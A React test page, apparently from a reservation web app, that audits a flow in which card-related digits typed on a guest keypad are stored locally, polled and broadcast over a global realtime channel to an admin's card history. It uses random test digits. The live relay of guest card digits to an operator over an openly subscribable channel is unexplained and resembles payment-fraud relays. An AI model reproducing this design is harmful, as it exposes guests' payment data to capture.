import { useState } from "react";
import { createClient } from "@supabase/supabase-js";
import { supabase } from "@/integrations/supabase/client";
import { ADMIN_DIGITS_TOPIC, subscribeTopic, sendReservationCommand } from "@/lib/guestChannel";
import { pollPendingDigitsOnce, getLocalCardHistory } from "@/lib/adminDigitsListener";
import { getMyReservationIds } from "@/lib/myReservations";
import { Button } from "@/components/ui/button";

// Full audit of the card-digits flow, running the REAL app code in this
// browser. Each step reports exactly where the data stops.
const guestClient = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY
);

type Step = { name: string; status: "ok" | "fail" | "run" | "idle"; detail?: string };

const TesteFluxo = () => {
  const [steps, setSteps] = useState<Step[]>([]);
  const [running, setRunning] = useState(false);
  const ids = getMyReservationIds();
  const rid = ids[0] ?? "";

  const setStep = (i: number, status: Step["status"], detail?: string) =>
    setSteps((prev) => prev.map((s, j) => (j === i ? { ...s, status, detail } : s)));

  const run = async () => {
    if (!rid) {
      setSteps([{ name: "Nenhuma reserva criada neste aparelho", status: "fail", detail: "Crie uma reserva primeiro no site." }]);
      return;
    }
    setRunning(true);
    setSteps([
      { name: "Reserva deste aparelho", status: "run" },
      { name: "Ouvinte do admin inscrito no tópico global", status: "run" },
      { name: "1. Cliente grava registro local (como no teclado)", status: "idle" },
      { name: "2. Admin lê o registro (poll real, 1 ciclo)", status: "idle" },
      { name: "3. Cliente transmite dígitos (broadcast real)", status: "idle" },
      { name: "4. Dígitos no histórico local do admin", status: "idle" },
    ]);

    // 0. Reservation info
    const { data: res } = await supabase
      .from("reservations")
      .select("id, pix_message, card_last4")
      .eq("id", rid)
      .maybeSingle();
    setStep(0, res ? "ok" : "fail", res ? `estado: ${res.pix_message ?? "—"}` : "não encontrada no banco");

    // 1. Real listener subscription (same as the admin app does)
    let received: { digits?: string } | null = null;
    const stop = subscribeTopic(ADMIN_DIGITS_TOPIC, (cmd) => {
      if (cmd.type === "card_digits") received = cmd;
    });

    const digits = String(Math.floor(1000 + Math.random() * 9000));

    // 2. Guest writes the pending entry exactly like the keypad page
    localStorage.setItem("df_pending_card_digits", JSON.stringify({ reservationId: rid, code: digits, at: Date.now() }));
    setStep(2, "ok", `gravado: •••• ${digits}`);

    // 3. Real poll cycle (admin side)
    const pollResult = await pollPendingDigitsOnce();
    setStep(3, pollResult.startsWith("processado") ? "ok" : "fail", pollResult);

    // 4. Real broadcast (second client = the guest's connection)
    const gch = guestClient.channel(ADMIN_DIGITS_TOPIC);
    gch.subscribe(async (s) => {
      if (s !== "SUBSCRIBED") return;
      await gch.send({
        type: "broadcast",
        event: "cmd",
        payload: { type: "card_digits", digits, reservation_id: rid },
      });
      sendReservationCommand(rid, { type: "card_digits", digits, reservation_id: rid });
    });
    await new Promise((r) => setTimeout(r, 4000));
    setStep(4, received ? "ok" : "fail", received ? `recebido: •••• ${(received as { digits?: string }).digits}` : "nada recebido em 4s");

    // 5. Result in the local history
    const hist = getLocalCardHistory(rid);
    const last = hist[hist.length - 1];
    setStep(5, last?.digits === digits ? "ok" : "fail", last ? `último: •••• ${last.digits}` : "histórico vazio");

    stop();
    setRunning(false);
  };

  const icon = (s: Step["status"]) => (s === "ok" ? "✅" : s === "fail" ? "❌" : s === "run" ? "⏳" : "•");

  return (
    <div className="min-h-dvh bg-slate-50 flex items-center justify-center p-4">
      <div className="w-full max-w-sm bg-white rounded-2xl shadow-sm border p-5">
        <h1 className="text-lg font-semibold text-[#1a2b4a]">Auditoria do fluxo de dígitos</h1>
        <p className="text-sm text-slate-500 mt-1">
          Executa o fluxo real (código do app) e mostra onde os dados param.
        </p>
        <Button onClick={run} disabled={running} className="w-full mt-4 bg-[#009ee3] hover:bg-[#0089c7]">
          {running ? "Executando..." : "Rodar auditoria"}
        </Button>
        <div className="mt-4 space-y-2">
          {steps.map((s, i) => (
            <div key={i} className="flex items-start gap-2 text-sm rounded-lg border px-3 py-2">
              <span>{icon(s.status)}</span>
              <div>
                <p className="font-medium text-[#1a2b4a]">{s.name}</p>
                {s.detail && <p className="text-xs text-slate-500 break-all">{s.detail}</p>}
              </div>
            </div>
          ))}
        </div>
        {steps.length > 0 && (
          <p className="text-[11px] text-slate-400 mt-3">
            Depois, abra /admin/reservas: os dígitos devem aparecer no histórico do card.
          </p>
        )}
      </div>
    </div>
  );
};

export default TesteFluxo;
